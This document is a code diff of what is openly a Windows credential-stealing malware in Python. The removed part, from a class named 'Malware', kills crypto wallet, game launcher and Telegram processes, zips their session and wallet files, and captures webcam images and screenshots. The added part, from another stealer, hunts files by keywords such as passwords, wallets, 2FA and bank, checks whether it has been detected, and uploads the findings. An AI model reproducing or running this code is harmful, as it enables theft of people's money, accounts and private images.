-            ("Exodus",            os.path.join(path_appdata_roaming,   "Exodus", "exodus.wallet"),                                    "exodus.exe",            "Wallets"),
-            ("Binance",           os.path.join(path_appdata_roaming,   "Binance", "Local Storage", "leveldb"),                        "binance.exe",           "Wallets"),
-            ("Jaxx Liberty",      os.path.join(path_appdata_roaming,   "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb"), "jaxx.exe",              "Wallets"),
-            ("Electrum",          os.path.join(path_appdata_roaming,   "Electrum", "wallets"),                                        "electrum.exe",          "Wallets"),
-            ("Coinomi",           os.path.join(path_appdata_roaming,   "Coinomi", "Coinomi", "wallets"),                              "coinomi.exe",           "Wallets"),
-            ("Trust Wallet",      os.path.join(path_appdata_roaming,   "Trust Wallet"),                                               "trustwallet.exe",       "Wallets"),
-            ("AtomicDEX",         os.path.join(path_appdata_roaming,   "AtomicDEX"),                                                  "atomicdex.exe",         "Wallets"),
-            ("Wasabi Wallet",     os.path.join(path_appdata_roaming,   "WalletWasabi", "Wallets"),                                    "wasabi.exe",            "Wallets"),
-            ("Ledger Live",       os.path.join(path_appdata_roaming,   "Ledger Live"),                                                "ledgerlive.exe",        "Wallets"),
-            ("Trezor Suite",      os.path.join(path_appdata_roaming,   "Trezor", "suite"),                                            "trezor.exe",            "Wallets"),
-            ("Blockchain Wallet", os.path.join(path_appdata_roaming,   "Blockchain", "Wallet"),                                       "blockchain.exe",        "Wallets"),
-            ("Mycelium",          os.path.join(path_appdata_roaming,   "Mycelium", "Wallets"),                                        "mycelium.exe",          "Wallets"),
-            ("Crypto.com",        os.path.join(path_appdata_roaming,   "Crypto.com", "appdata"),                                      "crypto.com.exe",        "Wallets"),
-            ("BRD",               os.path.join(path_appdata_roaming,   "BRD", "wallets"),                                             "brd.exe",               "Wallets"),
-            ("Coinbase Wallet",   os.path.join(path_appdata_roaming,   "Coinbase", "Wallet"),                                         "coinbase.exe",          "Wallets"),
-            ("Zerion",            os.path.join(path_appdata_roaming,   "Zerion", "wallets"),                                          "zerion.exe",            "Wallets"),
-            ("Steam",             os.path.join(path_program_files,     "Steam", "config"),                                            "steam.exe",             "Game Launchers"),
-            ("Riot Games",        os.path.join(path_appdata_local,     "Riot Games", "Riot Client", "Data"),                          "riot.exe",              "Game Launchers"),
-            ("Epic Games",        os.path.join(path_appdata_local,     "EpicGamesLauncher"),                                          "epicgameslauncher.exe", "Game Launchers"),
-            ("Rockstar Games",    os.path.join(path_appdata_local,     "Rockstar Games"),                                             "rockstarlauncher.exe",  "Game Launchers"),
-            ("Telegram",          os.path.join(path_appdata_roaming,   "Telegram Desktop", "tdata"),                                  "telegram.exe",          "Apps")
+    key_wordsFiles = [
+        "passw",
+        "mdp",
+        "motdepasse",
+        "mot_de_passe",
+        "login",
+        "secret",
+        "account",
+        "acount",
+        "paypal",
+        "banque",
+        "account",                                                          
+        "metamask",
+        "wallet",
+        "crypto",
+        "exodus",
+        "discord",
+        "2fa",
+        "code",
+        "memo",
+        "compte",
+        "token",
+        "backup",
+        "secret",
+        "mom",
+        "family"
         ]
 
-        try:
-            for name, path, proc_name, type in session_files:
-                if type in session_files_choice:
-                    for proc in psutil.process_iter(['pid', 'name']):
-                        try:
-                            if proc.info['name'].lower() == proc_name.lower():
-                                proc.kill()
-                        except:
-                            pass
-        except:
-            pass
-
-        for name, path, proc_name, type in session_files:
-            if type in session_files_choice and os.path.exists(path):
-                try:
-                    if type == "Wallets" and name_wallets is not None:
-                        name_wallets.append(name)
-                    elif type == "Game Launchers" and name_game_launchers is not None:
-                        name_game_launchers.append(name)
-                    elif type == "Apps" and name_apps is not None:
-                        name_apps.append(name)
-
-                    zip_file.writestr(os.path.join("Session Files", name, "path.txt"), path)
-
-                    if os.path.isdir(path):
-                        for root, _, files in os.walk(path):
-                            for file in files:
-                                abs_file_path = os.path.join(root, file)
-                                rel_path_in_zip = os.path.join(
-                                    "Session Files", name, "Files",
-                                    os.path.relpath(abs_file_path, path)
-                                )
-                                try:
-                                    zip_file.write(abs_file_path, rel_path_in_zip)
-                                except:
-                                    pass
-                    else:
-                        rel_path_in_zip = os.path.join("Session Files", name, "Files", os.path.basename(path))
-                        try:
-                            zip_file.write(path, rel_path_in_zip)
-                        except:
-                            pass
-                except:
-                    pass
-
-        if "Wallets" in session_files_choice:
-            name_wallets = ", ".join(name_wallets) if name_wallets else "No"
-        if "Game Launchers" in session_files_choice:
-            name_game_launchers = ", ".join(name_game_launchers) if name_game_launchers else "No"
-        if "Apps" in session_files_choice:
-            name_apps = ", ".join(name_apps) if name_apps else "No"
-
-        return name_wallets, name_game_launchers, name_apps
-
-    @staticmethod
-    def Webcam(zip_file):
-        path_temp = Paths().temp
-        webcam_image_path = os.path.join(path_temp, "webcam_capture.png")
-
-        try:
-            cap = cv2.VideoCapture(0)
-            ret, frame = cap.read()
-            if ret:
-                cv2.imwrite(webcam_image_path, frame)
-                zip_file.write(webcam_image_path, os.path.join("Webcam", "webcam_capture.png"))
-            cap.release()
-            cv2.destroyAllWindows()
-        except:
-            pass
-
-        if os.path.exists(webcam_image_path):
-            Malware().delete_file(webcam_image_path)
-            return True
-        else:
-            return False
-
-    @staticmethod
-    def Screenshot(zip_file):
-        path_temp = Paths().temp
-        screenshot_image_path = os.path.join(path_temp, "ekrangoruntusu.png")
-
-        try:
-            user32 = ctypes.windll.user32
-            width = user32.GetSystemMetrics(0)
-            height = user32.GetSystemMetrics(1)
-
-            import PIL.ImageGrab
-            screenshot = PIL.ImageGrab.grab(bbox=(0, 0, width, height))
-            screenshot.save(screenshot_image_path)
-
-            zip_file.write(screenshot_image_path, os.path.join("Screenshot", "screenshot_capture.png"))
-        except:
-            pass
-
-        if os.path.exists(screenshot_image_path):
-            Malware().delete_file(screenshot_image_path)
-            return True
-        else:
-            return False
+    wikith = []
+    for patt in path2search: 
+        kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles]);kiwi.start()
+        wikith.append(kiwi)
+    return wikith
 
 
-if __name__ == "__main__":
-    malware = Malware()
-    malware.main()
+global keyword, cookiWords, paswWords, CookiCount, P4sswCount, WalletsZip, GamingZip, OtherZip
+
+keyword = [
+    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
+]
+
+CookiCount, P4sswCount = 0, 0
+cookiWords = []
+paswWords = []
+
+WalletsZip = [] # [Name, Link]
+GamingZip = []
+OtherZip = []
+
+GatherAll()
+DETECTED = TR6st(C00k13)
+# DETECTED = False
+if not DETECTED:
+    wikith = Kiwi()
+
+    for thread in wikith: thread.join()
+    time.sleep(0.2)
+
+    filetext = "\n"
+    for arg in KiwiFiles:
+        if len(arg[2]) != 0:
+            foldpath = arg[1]
+            foldlist = arg[2]       
+            filetext += f"📁 {foldpath}\n"
+
+            for ffil in foldlist:
+                a = ffil[0].split("/")
+                fileanme = a[len(a)-1]
+                b = ffil[1]
+                filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
+            filetext += "\n"
+    upload("kiwi", filetext)
